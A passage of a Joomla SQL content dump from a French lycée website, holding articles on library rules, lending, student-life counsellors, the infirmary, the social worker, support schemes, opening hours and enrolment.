(27, 64, ' Accès et règles d''utilisation', 'acces-et-regles-d-utilisation', '', '<p> </p>\r\n<p style="color: #000000;">    La présentation de la <span style="font-weight: bold;">carte de lycéen</span> (ou d’étudiant) avec la photographie est obligatoire.</p>\r\n<p> </p>\r\n<p style="color: #000000;">    Le CDI est ouvert du <span style="font-weight: bold;">lundi au vendredi</span> sans interruption de <span style="font-weight: bold;">8h10 à 18h20</span> (sauf le <span style="font-weight: bold;">mercredi</span> où la fermeture se fait à <span style="font-weight: bold;">16h30</span>).</p>\r\n<p> </p>\r\n<p> </p>\r\n<p> </p>\r\n<p style="text-align: center; color: #000000; text-decoration: underline;">Règles d’utilisation du CDI</p>\r\n<p> </p>\r\n<p><span style="color: #ff0000;"><br /> <span style="color: #000000;">    Le Centre de Documentation et d’Information est un lieu privilégié où le <span style="font-weight: bold;">silence</span> et le calme sont nécessaires, chacun doit pouvoir trouver des conditions de travail et de lecture idéales. Si vous venez au CDI, vous vous engagez à respecter ces règles, toutes les personnes présentes ainsi que le matériel mis à votre disposition. </span></span></p>\r\n<p> </p>\r\n<p><span style="color: #000000;">        <span style="font-style: italic;">Utilisation de l’Internet au CDI</span> : sauf autorisation particulière du documentaliste, l’accès aux messageries , aux blogs, aux sites de jeux ou tout autre site non conforme à une recherche ou à un travail scolaire est rigoureusement interdit . <br /> </span></p>\r\n<p><span style="color: #ff0000;"><br /> </span></p>', '', -2, 0, 0, 2, '2012-10-29 16:10:13', 390, '', '0000-00-00 00:00:00', 0, 0, '0000-00-00 00:00:00', '2012-10-29 16:10:13', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 1, 0, 4, '', '', 1, 7, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(28, 65, 'Objectifs', 'objectifs', '', '<p> </p>\r\n<p style="color: #000000;">Les documentalistes en poste, MM. <span style="font-weight: bold;">Besanger</span>, <span style="font-weight: bold;">Depoux</span> et <span style="font-weight: bold;">Moreau</span>, accueillent tout la semaine élèves et enseignants pour :</p>\r\n<p> </p>\r\n<p style="color: #000000;">· Guider dans les recherches documentaires et initier aux nouvelles technologies ( BCDI 3, Internet…).</p>\r\n<p> </p>\r\n<p style="color: #000000;">· Mettre à disposition des documents, aider à les utiliser et à exploiter les informations qu’ils contiennent.</p>\r\n<p> </p>\r\n<p style="color: #000000;">. Rassembler les informations utiles à la vie du lycée et en faire bénéficier tout personne intéressée (affichage, messages ...)</p>\r\n<p> </p>\r\n<p style="color: #000000;">· Développer chez les élèves le goût de la lecture avec un vaste choix de romans et d’ouvrages littéraires. (N’hésitez pas à nous faire part de vos suggestions pour l’achat de nouveaux ouvrages.)</p>\r\n<p> </p>\r\n<p style="color: #000000;">. Participer aux actions menées dans l''établissement (TPE, Semaine de la Presse, expositions de travaux d''élèves...).</p>\r\n<p> </p>\r\n<p><span style="color: #000000;">· Enfin répondre dans la mesure du possible aux questions des élèves (travail scolaire, orientation, métiers, loisirs…).</span></p>\r\n<p> </p>\r\n<p> </p>\r\n<p> </p>\r\n<p><span style="color: #000000;">. Tout au long de l''année, ils communiquent avec vous par le biais de feuillets d''information, de messages personnels déposés dans les casiers, grâce à la messagerie Internet, par voie d''affichage papier et vidéo...</span></p>\r\n<p> </p>', '', -2, 0, 0, 2, '2012-10-29 16:10:30', 390, '', '0000-00-00 00:00:00', 0, 0, '0000-00-00 00:00:00', '2012-10-29 16:10:30', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 1, 0, 3, '', '', 1, 8, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(29, 66, 'Prêts', 'prets', '', '<p>Les romans, les documentaires, les périodiques (sauf les numéros du mois en cours) sont prêtés pour une durée de <span style="font-weight: bold;">3 semaines</span> sur présentation de votre carte de lycéen ou d’étudiant.</p>\r\n<p><span> Nombre de maximal d’ouvrages empruntés : <span style="font-weight: bold;">3</span>. Les usuels ne sont pas prêtés, ni les documents de l’ONISEP ou du CIDJ.</span></p>\r\n<p> </p>', '', -2, 0, 0, 11, '2012-10-29 16:10:41', 390, '', '2012-10-29 16:23:12', 390, 0, '0000-00-00 00:00:00', '2012-10-29 16:10:41', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 3, 0, 2, '', '', 1, 0, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(30, 67, 'Liens CDI', 'liens-cdi', '', '<p style="text-align: left;" align="center"><span style="color: #333333;">Découvrez notre liste de liens utiles pour votre orientation et votre vie étudiante.</span></p>\r\n', '\r\n<p align="center"><strong><span style="color: #333333;"> Actuel-cidj.info :<br /> </span></strong><span style="color: #000000;">Information des jeunes : études, stages en entreprise et jobs d''été, bourses, logement étudiant, sejours linguistiques, aide à l’orientation scolaire et professionnelle.</span><br /> <span style="color: #ff0000;">Accessible uniquement sur les postes du lycée.</span><br /> <a href="http://www.actuel-cidj.info/" target="_blank"><img src="http://www.lms.ens-cachan.fr/images/cidj.gif" border="0" width="136" height="67" /></a></p>\r\n<p align="center">_____________________________</p>\r\n<p align="center"><strong><span style="color: #333333;">Les métiers.net :<br /> </span></strong><span style="color: #000000;">Choisir sa formation, son orientation ou choisir son métier : LesMetiers.net vous informe sur les métiers et les formations en</span> <span style="color: #000000;">Ile-de-France</span></p>\r\n<p align="center"><a href="http://www.lesmetiers.net/" target="_blank"><img src="http://www.lms.ens-cachan.fr/images/image-12112-metiers.jpg" border="0" width="103" height="72" /></a></p>', -2, 0, 0, 11, '2012-10-29 16:11:02', 390, '', '2012-10-29 16:25:42', 390, 0, '0000-00-00 00:00:00', '2012-10-29 16:11:02', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 3, 0, 3, '', '', 1, 7, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(31, 69, 'Les C.P.E.', 'les-c-p-e', '', '<p> </p>\r\n<p>Suivi des classes par les conseillers principaux d''éducation</p>\r\n', '\r\n<p style="; text-align: center;"> </p>\r\n<h3 style="text-align: center;"> </h3>\r\n<h3 class="desc" style="text-align: center;"><span style="text-align: left;"><a href="http://www.lms.ens-cachan.fr/reglement2011-2012.pdf">Règlement des Lycéens</a></span><span style="color: #333333; font-family: Tahoma, Helvetica, Arial, sans-serif; font-size: 12px; line-height: 1.3em;"> </span></h3>\r\n<h3 class="desc" style="text-align: center;"><a href="http://www.lms.ens-cachan.fr/reglementBTS2010.pdf"><span style="text-align: left;">Règlement des BTS</span></a></h3>\r\n<hr style="width: 100%; height: 2px;" />\r\n<p style="; text-align: left;"><br />Suivi des classes par les conseillers principaux d''éducation<br /><br />(4ème étage)<br /><br />-Accueil et encadrement des élèves<br /><br />-Suivi des résultats et de l’assiduité<br /><br />-Inscriptions, organisation et déroulement des examens<br /><br />   -Animation éducative<strong> <br /></strong></p>\r\n<h3 style="text-align: center;"><strong>  </strong><span style="color: #333333; font-family: Tahoma, Helvetica, Arial, sans-serif; font-size: 12px; line-height: 1.3em;">Mme HEBERT </span></h3>\r\n<p style="; text-align: center;">    01 47 40 49 77</p>\r\n<p> </p>\r\n<table width="98%" border="1">\r\n<tbody>\r\n<tr style="height: 21pt;">\r\n<td class="xl22" style="border-right: 1pt solid black; height: 21pt; width: 210pt; text-align: center;" colspan="3" width="280" height="28">PRE-BAC</td>\r\n<td class="xl22" style="border-left: medium none; border-right: 1pt solid black; width: 275pt; text-align: center;" colspan="4" width="365">POST-BAC</td>\r\n</tr>\r\n<tr style="height: 20.25pt;">\r\n<td class="xl25" style="height: 20.25pt; text-align: left;" height="27">2nde 1</td>\r\n<td class="xl26" style="border-left: medium none; text-align: left;">1ère ES2</td>\r\n<td class="xl27" style="border-left: medium none; text-align: left;">T ES.1</td>\r\n<td class="xl25" style="border-left: medium none; text-align: left;">CPGE 1</td>\r\n<td class="xl26" style="border-left: medium none; text-align: left;">CI 1</td>\r\n<td class="xl26" style="border-left: medium none; text-align: left;">AM1</td>\r\n<td class="xl27" style="border-left: medium none; text-align: left;"> </td>\r\n</tr>\r\n<tr style="height: 20.25pt;">\r\n<td class="xl28" style="border-top: medium none; height: 20.25pt; text-align: left;" height="27">2nde 2</td>\r\n<td class="xl29" style="border-top: medium none; border-left: medium none; text-align: left;"> </td>\r\n<td class="xl30" style="border-top: medium none; border-left: medium none; text-align: left;">T ES.2</td>\r\n<td class="xl28" style="border-top: medium none; border-left: medium none; text-align: left;"> CPGE 2</td>\r\n<td class="xl29" style="border-top: medium none; border-left: medium none; text-align: left;"> CI 2</td>\r\n<td class="xl29" style="border-top: medium none; border-left: medium none; text-align: left;">AM2</td>\r\n<td class="xl30" style="border-top: medium none; border-left: medium none; text-align: left;"> </td>\r\n</tr>\r\n<tr style="height: 21pt;">\r\n<td class="xl32" style="border-top: medium none; height: 21pt; text-align: left;" height="28"> </td>\r\n<td class="xl33" style="border-top: medium none; border-left: medium none; text-align: left;">1ère ES/S</td>\r\n<td class="xl31" style="border-top: medium none; border-left: medium none; text-align: left;">TS</td>\r\n<td class="xl32" style="border-top: medium none; border-left: medium none; text-align: left;"> </td>\r\n<td class="xl33" style="border-top: medium none; border-left: medium none; text-align: left;"> </td>\r\n<td class="xl33" style="border-top: medium none; border-left: medium none; text-align: left;"> </td>\r\n<td class="xl31" style="border-top: medium none; border-left: medium none; text-align: left;"> </td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<p> </p>\r\n<p> </p>\r\n<h3 style="text-align: center;"><strong>  </strong><span style="color: #333333; font-family: Tahoma, Helvetica, Arial, sans-serif; font-size: 12px; line-height: 1.3em;">Mme PROCHEROT </span></h3>\r\n<p style="; text-align: center;">          01 47 40 49 76</p>\r\n<p> </p>\r\n<table width="98%" border="1">\r\n<tbody>\r\n<tr style="height: 21pt;">\r\n<td class="xl24" style="border-right: 1pt solid black; height: 21pt; width: 210pt; text-align: center;" colspan="3" width="280" height="28">PRE-BAC</td>\r\n<td class="xl24" style="border-left: medium none; border-right: 1pt solid black; width: 275pt; text-align: center;" colspan="4" width="365">POST-BAC</td>\r\n</tr>\r\n<tr style="height: 20.25pt;">\r\n<td class="xl27" style="height: 20.25pt; text-align: center;" height="27">2nde 3</td>\r\n<td class="xl28" style="border-left: medium none; text-align: center;">1ère L</td>\r\n<td class="xl33" style="border-left: medium none; text-align: center;"><span> </span>T L</td>\r\n<td class="xl27" style="text-align: center;">CGO1</td>\r\n<td class="xl28" style="border-left: medium none; text-align: center;">BMP 1</td>\r\n<td class="xl28" style="border-left: medium none; text-align: center;">ABM 1</td>\r\n<td class="xl34" style="border-left: medium none; text-align: center;"><span> </span> ESF 1</td>\r\n</tr>\r\n<tr style="height: 20.25pt;">\r\n<td class="xl29" style="border-top: medium none; height: 20.25pt; text-align: center;" height="27">2nde 4</td>\r\n<td class="xl30" style="border-top: medium none; border-left: medium none; text-align: center;">1ère STL</td>\r\n<td class="xl35" style="border-top: medium none; border-left: medium none; text-align: center;">T STL</td>\r\n<td class="xl29" style="border-top: medium none; text-align: center;">CGO2</td>\r\n<td class="xl30" style="border-top: medium none; border-left: medium none; text-align: center;">BMP 2</td>\r\n<td class="xl30" style="border-top: medium none; border-left: medium none; text-align: center;">ABM 2</td>\r\n<td class="xl36" style="border-top: medium none; border-left: medium none; text-align: center;">ESF 2 </td>\r\n</tr>\r\n<tr style="height: 21pt;">\r\n<td class="xl31" style="border-top: medium none; height: 21pt; text-align: center;" height="28"> </td>\r\n<td class="xl32" style="border-top: medium none; border-left: medium none; text-align: center;"> </td>\r\n<td class="xl37" style="border-top: medium none; border-left: medium none; text-align: center;"> </td>\r\n<td class="xl31" style="border-top: medium none; text-align: center;"> </td>\r\n<td class="xl32" style="border-top: medium none; border-left: medium none; text-align: center;"> </td>\r\n<td class="xl32" style="border-top: medium none; border-left: medium none; text-align: center;"> </td>\r\n<td class="xl38" style="border-top: medium none; border-left: medium none; text-align: center;"> </td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<p> </p>\r\n<p> </p>\r\n<h3 style="; text-align: center;">  <span style="color: #333333; font-family: Tahoma, Helvetica, Arial, sans-serif; font-size: 12px; line-height: 1.3em;">M. DECELLE</span></h3>\r\n<p style="; text-align: center;">    01 47 40 49 78</p>\r\n<p> </p>\r\n<table width="98%" border="1">\r\n<tbody>\r\n<tr style="height: 21pt;">\r\n<td class="xl24" style="border-right: 1pt solid black; height: 21pt; width: 210pt; text-align: center;" colspan="3" width="280" height="28">PRE-BAC</td>\r\n<td class="xl24" style="border-left: medium none; border-right: 1pt solid black; width: 275pt; text-align: center;" colspan="4" width="365">POST-BAC</td>\r\n</tr>\r\n<tr style="height: 20.25pt;">\r\n<td class="xl27" style="height: 20.25pt; text-align: center;" height="27">2nde 5</td>\r\n<td class="xl28" style="border-left: medium none; text-align: center;">1 SMTG1</td>\r\n<td class="xl29" style="border-left: medium none; text-align: center;">TSMTG1</td>\r\n<td class="xl27" style="border-left: medium none; text-align: center;">SIO1A</td>\r\n<td class="xl28" style="border-left: medium none; text-align: center;">SIO2 A</td>\r\n<td class="xl28" style="border-left: medium none; text-align: center;"> </td>\r\n<td class="xl29" style="border-left: medium none; text-align: center;"> </td>\r\n</tr>\r\n<tr style="height: 20.25pt;">\r\n<td class="xl30" style="border-top: medium none; height: 20.25pt; text-align: center;" height="27"> </td>\r\n<td class="xl31" style="border-top: medium none; border-left: medium none; text-align: center;">1 SMTG2</td>\r\n<td class="xl32" style="border-top: medium none; border-left: medium none; text-align: center;">TSMTG2</td>\r\n<td class="xl30" style="border-top: medium none; border-left: medium none; text-align: center;">SIO1B</td>\r\n<td class="xl31" style="border-top: medium none; border-left: medium none; text-align: center;">SIO2 B </td>\r\n<td class="xl31" style="border-top: medium none; border-left: medium none; text-align: center;"> </td>\r\n<td class="xl32" style="border-top: medium none; border-left: medium none; text-align: center;"> </td>\r\n</tr>\r\n<tr style="height: 21pt;">\r\n<td class="xl33" style="border-top: medium none; height: 21pt; text-align: center;" height="28"> </td>\r\n<td class="xl34" style="border-top: medium none; border-left: medium none; text-align: center;">1 ST2S</td>\r\n<td class="xl35" style="border-top: medium none; border-left: medium none; text-align: center;">T ST2S</td>\r\n<td class="xl33" style="border-top: medium none; border-left: medium none; text-align: center;"> </td>\r\n<td class="xl34" style="border-top: medium none; border-left: medium none; text-align: center;"> </td>\r\n<td class="xl34" style="border-top: medium none; border-left: medium none; text-align: center;"> </td>\r\n<td class="xl35" style="border-top: medium none; border-left: medium none; text-align: center;"> </td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<p> </p>\r\n<p>L''accueil des élèves, tous niveaux confondus, se fait à la Vie Scolaire (<span style="color: #3333ff;"><span>salle</span></span><span style="font-weight: bold; color: #3333ff;"> 403</span>).</p>', -2, 0, 0, 12, '2012-10-29 16:12:20', 390, '', '2016-06-09 07:46:07', 390, 0, '0000-00-00 00:00:00', '2012-10-29 16:12:20', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 13, 0, 3, '', '', 1, 97, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(32, 70, 'L''infirmerie', 'l-infirmerie', '', '<p>L''infirmerie du lycée est située au rez-de-chaussée, près de la loge d''entrée et du bureau de l''assistante sociale.<br /><br />Elle est commune aux deux lycées du campus.</p>\r\n', '\r\n<p>Les infirmières, Mme CHICHA et Mme GLORIEUX, accueillent les élèves des deux établissements du lundi au vendredi de 08h15 à 17h00, sauf le mercredi de 08h30 à 12h00.<br /><br /> <br /><br /> <br /><br />L''infirmerie est bien entendue ouverte à tout collègue qui aurait un quelconque besoin de soins durant son exercice professionnel, ou pour un conseil, un avis concernant un de ses élèves.<br /><br /> <br /><br /> <br /><br />Le médecin scolaire, Mme BOUDOT, reçoit les élèves sur rendez-vous exclusivement. Les rendez-vous sont pris auprès de l''infirmière de l''établissement.  (tél. 01.47.40.49.69)<br /><br /> <br /><br /> <br /><br />Nous vous rappelons que nous disposons d''une permanence d''accueil, exclusivement réservée à nos élèves, tenue par un psychologue de l''association AERA, le jeudi entre 11h30 et 13h00. Les élèves qui désirent consulter (gratuitement) doivent venir s''inscrire à l''infirmerie.<br /><br /> <br /><br /><br /><br />En cas d''incident de nature médicale en dehors des horaires d''ouverture, veuillez vous référer au protocole d''urgence affiché dans les points stratégiques du lycée (loge, porte de l''infirmerie, bureau des CPE, etc..). Appel du 15 : S.A.M.U.</p>', -2, 0, 0, 12, '2012-10-29 16:12:38', 390, '', '2013-03-13 19:10:59', 390, 0, '0000-00-00 00:00:00', '2012-10-29 16:12:38', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 4, 0, 2, '', '', 1, 72, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(33, 71, ' L''assistante sociale', 'l-assistante-sociale', '', '<p>Le bureau de l''assistante sociale, Mme BOZZOLINI, se situe au rez-de-chaussée, à côté de l''infirmerie.</p>\r\n', '\r\n<p><br />L''assistante sociale est présente au lycée les lundis et jeudis de 09h à 17h30 et un mercredi sur deux de 09h à 12h30.<br /><br /> <br /><br />Sous réserve de modifications, se référer à l''emploi du temps hebdomadaire affiché sur la porte du pôle médico-social.<br /><br />   <br />Mme BOZZOLINI est joignable au 01 47 40 49 68 (ligne directe) et par mail  <br />bozzolini@lms.ens-cachan.fr.</p>', -2, 0, 0, 12, '2012-10-29 16:13:08', 390, '', '2013-03-13 19:07:52', 390, 0, '0000-00-00 00:00:00', '2012-10-29 16:13:08', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 5, 0, 6, '', '', 1, 70, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', '');
INSERT INTO `jos_content` (`id`, `asset_id`, `title`, `alias`, `title_alias`, `introtext`, `fulltext`, `state`, `sectionid`, `mask`, `catid`, `created`, `created_by`, `created_by_alias`, `modified`, `modified_by`, `checked_out`, `checked_out_time`, `publish_up`, `publish_down`, `images`, `urls`, `attribs`, `version`, `parentid`, `ordering`, `metakey`, `metadesc`, `access`, `hits`, `metadata`, `featured`, `language`, `xreference`) VALUES
(34, 72, 'Dispositifs de soutien', 'dispositifs-de-soutien', '', '<p>Découvrez les différents dispositifs de soutien que nos équipes pédagogiques ont mis en place.</p>\r\n', '\r\n<p>Si j’ai besoin d’une <strong>aide ponctuelle</strong>,<span>  </span>parce que je ne sais pas faire un exercice, parce que je n’ai pas bien compris tel point de la leçon, ou parce que je ne sais pas comment m’y prendre pour réviser un contrôle…. je peux aller, sans rendez-vous,<span>  </span>rencontrer les professeurs d’<strong>« <em>SOS</em></strong><em> <strong>MATIERES</strong></em><strong> »</strong> qui se tiennent à la disposition des élèves, chaque jour entre 12h et 14h.</p>\r\n<p class="MsoNormal" style="text-align: justify;">Si j’ai besoin d’aide supplémentaire sur une période longue pour <strong>combler des lacunes</strong>, pour « mieux comprendre », ou pour approfondir un cours, je peux aller voir les « <strong><em>Assistants Pédagogiques</em></strong><em> </em>»<em>.</em></p>\r\n<p class="MsoBodyText">Ils sont présents au moins chaque mercredi<span>  </span>à partir de 11h et souvent un ou deux jours en plus dans la semaine.</p>\r\n<p class="MsoBodyText">Ils interviennent dans différentes disciplines d’enseignement scientifiques, littéraires et linguistiques.</p>\r\n<p class="MsoNormal" style="text-align: justify;"> </p>\r\n<p class="MsoNormal" style="text-align: justify;">Si j’ai besoin d’être soutenu dans mes efforts, <strong>encouragé</strong>, stimulé, si j’ai besoin d’aide pour <strong>m’organiser</strong> et travailler efficacement, si j’ai besoin de réfléchir à mon orientation, alors je peux demander à bénéficier d’un « <strong><em>tuteur</em></strong> ».</p>\r\n<p class="MsoNormal" style="text-align: justify;">Le tuteur qui me suivra sera un professeur ou un CPE, mais il ne sera pas un professeur qui intervient dans ma classe, ce qui me permettra d’engager avec lui un autre type de relation que celle que j’ai habituellement avec les enseignants de la classe.<span style="line-height: 1.3em;"> </span></p>\r\n<p class="MsoNormal"> </p>\r\n<p class="MsoNormal" style="text-align: justify;">Si j’ai tendance à m’absenter, et que ces <strong>absences</strong> pourraient faire de moi un «  élève décrocheur », dès le mois de novembre, ma situation sera examinée par les membres du <span style="font-style: italic;">GAIN</span> ( groupe d’aide à l’insertion). Des préconisations me seront alors transmises pour remédier à mon absentéisme.</p>\r\n<p class="MsoNormal" style="text-align: justify;"> </p>\r\n<p class="MsoNormal" style="text-align: justify;">Si j’aime le <strong><em>ski</em></strong>, <strong><em>les voyages</em></strong> à l’étranger, la <a href="http://www.lms.ens-cachan.fr/danse.pdf" target="_blank"><strong><em>danse</em></strong></a>, le <strong><em>théâtre</em></strong>, j’ai toutes les chances de partir ou de participer au dispositif « <strong><em>plaisir d’apprendre</em></strong> ».</p>\r\n<p class="MsoNormal"> <span style="line-height: 1.3em;"> </span></p>\r\n<p class="MsoNormal" style="text-align: justify;">Enfin, si je suis en Terminale, je pourrai partir accompagné de mes professeurs en <strong><em>stage de</em></strong> <strong><em>révision </em></strong>!</p>', -2, 0, 0, 12, '2012-10-29 16:13:31', 390, '', '2013-03-14 16:59:11', 390, 0, '0000-00-00 00:00:00', '2012-10-29 16:13:31', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 6, 0, 5, '', '', 1, 68, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(52, 93, 'LES HORAIRES', 'les-horaires', '', '<p><strong><span style="font-size: 14px; line-height: 1.3em;">Le lycée est ouvert aux heures suivantes :</span></strong></p>\r\n<p><strong>du lundi au vendredi : <span style="font-size: 14px; line-height: 1.3em;">8h - 18h </span></strong></p>\r\n<p><strong><span style="font-size: 14px; line-height: 1.3em;">samedi : 8h - 12h30</span></strong></p>\r\n<p><strong> </strong></p>\r\n<p> </p>', '', -2, 0, 0, 12, '2013-04-05 15:15:24', 390, '', '2016-04-01 10:15:12', 390, 0, '0000-00-00 00:00:00', '2013-04-05 15:15:24', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 3, 0, 0, '', '', 1, 73, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(35, 73, 'Orientation', 'orientation', '', '<p> </p>\r\n<p>Permanence au lycée de Mme DAUDIER<br />Horaire : mardi 09h-17h30</p>\r\n<p> </p>\r\n', '\r\n<p>Permanence au lycée de <strong>Mme DAUDIER</strong></p>\r\n<p><br />Horaire : <strong>mardi 09h-17h30</strong><br /><br />(<strong>L’agenda est tenu par les surveillants</strong> au bureau de la vie scolaire salle<strong> 403</strong>)<br /><br />-Elle accueille les élèves et/ou leurs parents sur rendez-vous.<br /><br />Il est nécessaire de prendre rendez-vous au bureau de la Vie Scolaire.<br /><br />Bureau :<strong> 2ème étage face au grand escalier</strong><br /><br />Elle a pour mission d''accompagner les lycéens :<br /><br />-à la prise de décision aux différents paliers d''orientation.<br /><br />-pour les aider à s''informer sur les différentes poursuites d''études possibles, en collaboration avec les professeurs principaux et les équipes éducatives pour construire un projet scolaire et professionnel.</p>\r\n<p>-à participer avec les équipes à l''accompagnement des élèves en voie de déscolarisation, ou rencontrant des difficultés dans leur parcours scolaire.<br /><br />Vous pouvez aussi rencontrer Mme DAUDIER, au Centre d’Information et d’Orientation sans rendez-vous :<br /><br /><strong>2, rue de Chevilly 94240 L’Hay-Les-Roses </strong></p>\r\n<p><strong>Tél :01.46.64.19.12</strong></p>', -2, 0, 0, 12, '2012-10-29 16:13:49', 390, '', '2013-03-13 19:11:49', 390, 0, '0000-00-00 00:00:00', '2012-10-29 16:13:49', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 12, 0, 4, '', '', 1, 65, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(40, 79, 'Pré-Bac (seconde, première et terminale)', 'pre-bac-seconde-premiere-et-terminale', '', '<h2>Pré-Bac (seconde, première et terminale)</h2>\r\n<p>Le dossier d''inscription ne sera remis que sur présentation de la notification d''affectation émise par l''inspection académique de Créteil.</p>\r\n<p style="font-style: italic;">Inspection Académique</p>\r\n<p style="font-style: italic;">Division des élèves, de la scolarité et de la pédagogie</p>\r\n<p style="font-style: italic;">68 avenue du Général de Gaulle</p>\r\n<p><span style="font-style: italic;">94011 CRETEIL cedex</span></p>\r\n<p>ou <a href="http://www.ia94.ac-creteil.fr/" target="_blank">www.ia94.ac-creteil.fr</a></p>\r\n<p>Pour toute information merci de vous rapprocher de l''établissement d''origine.</p>\r\n<p><em>Remarque</em><em>:</em> pour les élèves scolarisés dans un établissement public du Val de Marne la notification sera remise par l''établissement d''origine.</p>', '', -2, 0, 0, 7, '2012-10-29 18:54:07', 390, '', '2016-06-08 12:24:29', 390, 0, '0000-00-00 00:00:00', '2012-10-29 18:54:07', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 13, 0, 5, '', '', 1, 163, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
